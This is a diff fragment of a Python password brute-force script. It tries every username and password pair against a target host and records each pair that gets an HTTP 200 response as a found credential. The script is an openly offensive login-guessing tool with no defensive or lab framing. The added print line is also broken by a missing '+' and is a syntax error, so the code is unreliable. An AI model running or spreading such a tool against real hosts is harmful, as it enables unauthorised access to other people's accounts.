@@ -33,12 +33,20 @@ else:
 
 p_list = args.passwords.read().splitlines()
 
+found = []
+
 for u in u_list:
 	for p in p_list:
 		print("bruting.... " + u + ":" + p)
 		r = brute(args.host, u, p)
 		if r.status_code == 200:
+			found.append((u,p))
 			break
+
 print("----------------")
-print("Found a match: " + u + ":" + p)
+
+if len(found)>0:
+	print("Found something:")
+	for i in found:
+		print(i[0]+":"i[1])
 
